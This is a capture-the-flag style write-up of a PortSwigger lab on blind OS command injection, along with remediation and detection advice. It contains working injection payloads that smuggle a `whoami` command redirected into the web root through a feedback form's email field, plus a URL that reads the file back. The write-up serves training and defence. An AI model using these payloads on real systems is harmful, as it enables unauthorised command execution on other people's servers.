# Blind OS Command Injection with Output Redirection

| Field | Detail |
|---|---|
| Lab | Blind OS command injection with output redirection |
| Platform | PortSwigger Web Security Academy |
| Vulnerability | Blind OS Command Injection (output redirection) |
| CWE | CWE-78: Improper Neutralization of Special Elements used in an OS Command |
| Severity | High |
| Date | 13 November 2026 |
| Author | Md Jahidur Rahman Jahid |

## Summary

The feedback form passes user-supplied input into a shell command on the
server without validation. The command output is never shown in the
response, so the injection is blind. But the output can be redirected
with `>` into a file inside the web root, and then read back through the
browser — turning a blind injection into a visible one.

## Steps to Reproduce

1. Submit the feedback form and intercept the POST request in Burp Suite.
   Send it to Repeater. The request has five fields: `csrf`, `name`,
   `email`, `subject`, and `message`.
2. First try: put the redirect in the `email` field using `&` as the
   separator:

```text
email=wiener%40gm.com&whoami>/var/www/images/test.txt&&subject=...
```

   This did not work. In a form body, `&` separates parameters, so the
   server cut the email value off at the first `&` and the `whoami`
   part never reached the shell. The response was a clean 200 with
   nothing in it, and no file was created.

3. Second try: use `||` instead, the separator that worked in the
   time-delay lab:

```http
POST /feedback/submit HTTP/1.1
Host: 0a79009f03a694b385d5eab300170062.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Cookie: session=[REDACTED]

csrf=[REDACTED]&name=wiener&email=wiener@40gm.com||whoami>/var/www/images/test.txt||&subject=what+is+love&message=mhgcmgbcmbn
```

   `||` means OR — run the command on the right only if the one on the
   left fails. `wiener@40gm.com` is not a real command, so it fails,
   and `whoami>/var/www/images/test.txt` runs, writing the output into
   a file the web server can serve.

4. Read the file back in the browser:

```text
https://0a79009f03a694b385d5eab300170062.web-security-academy.net/image?filename=test.txt
```

## Evidence

Burp Repeater — injected request (left) and the response (right). The
response body is only `{}`, with no command output — this is a blind
injection.

![Burp Repeater — output redirection payload in the email field](images/os-command-injection-lab3-repeater.png)

The file read back in the browser shows the command output — the server
username:

![Browser — test.txt showing the whoami output, peter-gEM0P3](images/os-command-injection-lab3-output.png)

```text
peter-gEM0P3
```

## Impact

An attacker who can run OS commands on the server can:

- Read sensitive files and configuration (including credentials) by
  redirecting the output into a file and reading it back, as shown here.
- Steal or modify application data.
- Write files to the web root — including, in the worst case, a web
  shell for ongoing access.
- Take full control of the server.

Blind injection is not less dangerous than visible injection — the
attacker only needs a different way to get the output out.

## Remediation

- Never build shell commands from user input. Use safe APIs or libraries
  instead of invoking the shell.
- If a shell call is unavoidable, validate the input strictly — for an
  email field, accept only a valid email format (allowlist) and reject
  everything else.
- Do not let the application write files into the web root.
- Run the application with the least privilege needed, so a successful
  injection exposes as little as possible.

## Detection (SOC)

- Alert on web requests where input fields contain command separators
  (`||`, `|`, `;`) or redirection (`>`) or command words such as
  `whoami`, `id`, or `cat`.
- Alert on new or unexpected files appearing in web-served directories
  such as `/images/`.
- Alert on unexpected child processes (shell commands) spawned by the
  web server process.

## References

- PortSwigger — Blind OS command injection: https://portswigger.net/web-security/os-command-injection/blind
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
